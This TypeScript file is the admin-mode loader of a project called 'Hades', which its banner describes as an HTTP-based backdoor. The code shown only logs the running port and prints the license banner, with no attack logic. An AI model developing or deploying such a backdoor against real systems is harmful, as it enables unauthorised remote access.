import { AdminLogger } from "./adminLogger.js";

export class AdminCLILoader
{
    private license:string = `
    Hades - Copyright (C) 2022-2023 France.
     _    _          _____  ______  _____ 
    | |  | |   /\\   |  __ \\|  ____|/ ____|
    | |__| |  /  \\  | |  | | |__  | (___  
    |  __  | / /\\ \\ | |  | |  __|  \\___ \\ 
    | |  | |/ ____ \\| |__| | |____ ____) |
    |_|  |_/_/    \\_\\_____/|______|_____/ 
    Hades is a backdoor developped by Antoine Bartoli, 
    please do not use it for non-legals preposes.
    Hades is not a ssh software, it uses http protocols.`;

    private runningPort:number;
    private adminLogger:AdminLogger;

    public constructor(runningPort:number, adminLogger:AdminLogger)
    {
        this.runningPort = runningPort;
        this.adminLogger = adminLogger;
        
        this.adminLogger.log(`Running Hades admin mode on port ${this.runningPort.toString()}`);
        console.log(this.license);
    }
}